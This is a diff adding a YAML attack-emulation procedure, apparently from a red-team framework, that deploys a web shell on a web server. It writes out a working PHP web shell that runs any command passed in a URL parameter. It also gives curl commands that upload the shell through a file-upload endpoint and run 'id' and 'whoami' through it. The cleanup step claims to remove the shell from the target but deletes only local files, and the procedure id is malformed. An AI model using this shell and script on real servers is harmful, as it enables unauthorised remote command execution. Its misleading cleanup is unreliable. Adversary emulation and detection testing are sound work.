@@ -1,0 +1,106 @@
+name: "012: Web shell deployment"
+description: "Deploy web shells on compromised web servers for persistent access and command execution"
+id: "e5f8b0g3-9d2c-5b7g-0e3f-6c4d9b2g7f8e"
+api_version: "2.0"
+platform: darwin
+tags:
+  - initial_access
+  - web_exploitation
+  - web_shell
+  - persistence
+actors: []
+mitre_attack:
+  tactics:
+    - initial_access
+    - persistence
+  techniques:
+    - T1190
+    - T1505
+procedure_examples: []
+arguments:
+  target_url:
+    description: "Target web server URL"
+    type: string
+    required: true
+    default: "http://vulnerable-server.local/uploads"
+  shell_path:
+    description: "Path to web shell file to deploy"
+    type: string
+    required: true
+    default: "/tmp/shell.php"
+  shell_name:
+    description: "Name of the web shell file on target"
+    type: string
+    required: true
+    default: "shell.php"
+  upload_endpoint:
+    description: "Endpoint that accepts file uploads"
+    type: string
+    required: true
+    default: "/upload.php"
+steps:
+  - name: "Create web shell"
+    description: "Generate a web shell payload"
+    command: |
+      echo "[*] Creating web shell payload"
+      cat > "${shell_path}" << 'SHELL'
+      <?php
+      if(isset($_GET['cmd'])){
+        echo "<pre>";
+        $cmd = ($_GET['cmd']);
+        system($cmd);
+        echo "</pre>";
+        die;
+      }
+      ?>
+      SHELL
+      echo "[+] Web shell created at ${shell_path}"
+  - name: "Upload shell to target"
+    description: "Upload the web shell to the target server"
+    command: |
+      echo "[*] Uploading web shell to target"
+      curl -s -F "file=@${shell_path}" "${target_url}${upload_endpoint}" -o /tmp/upload_response.txt
+      cat /tmp/upload_response.txt
+  - name: "Verify shell execution"
+    description: "Test command execution through the web shell"
+    command: |
+      echo "[*] Testing web shell command execution"
+      shell_url="${target_url%/*}/$(basename ${shell_path})"
+      curl -s "${shell_url}?cmd=id" | head -20
+  - name: "Establish persistence"
+    description: "Configure shell for persistent access"
+    command: |
+      echo "[*] Configuring persistent access"
+      shell_url="${target_url%/*}/$(basename ${shell_path})"
+      curl -s "${shell_url}?cmd=whoami" > /tmp/shell_access.log
+      echo "[+] Shell access verified and logged"
+checks:
+  - name: "Shell accessibility check"
+    description: "Verify the web shell is accessible"
+    command: |
+      shell_url="${target_url%/*}/$(basename ${shell_path})"
+      curl -s -o /dev/null -w '%{http_code}' "${shell_url}" | grep -q '200' && echo 'PASS' || echo 'FAIL'
+  - name: "Command execution check"
+    description: "Verify command execution through shell"
+    command: |
+      shell_url="${target_url%/*}/$(basename ${shell_path})"
+      curl -s "${shell_url}?cmd=whoami" | grep -q 'root\|www\|apache\|nginx' && echo 'PASS' || echo 'FAIL'
+tests:
+  - name: "shell_deployment_test"
+    description: "Test web shell deployment in dry run mode"
+    dry_run: true
+    command: |
+      echo "[TEST] Simulating web shell deployment"
+      echo "[TEST] Target URL: ${target_url}"
+      echo "[TEST] Upload endpoint: ${upload_endpoint}"
+      echo "[TEST] Shell name: ${shell_name}"
+      echo "[TEST] Would deploy shell and test execution"
+cleanup:
+  - name: "Remove web shell"
+    description: "Delete the deployed web shell from target and local files"
+    command: |
+      echo "[*] Cleaning up web shells"
+      rm -f "${shell_path}" 2>/dev/null
+      rm -f /tmp/shell_* 2>/dev/null
+      rm -f /tmp/upload_response.txt 2>/dev/null
+      echo "[+] Web shell cleanup complete"
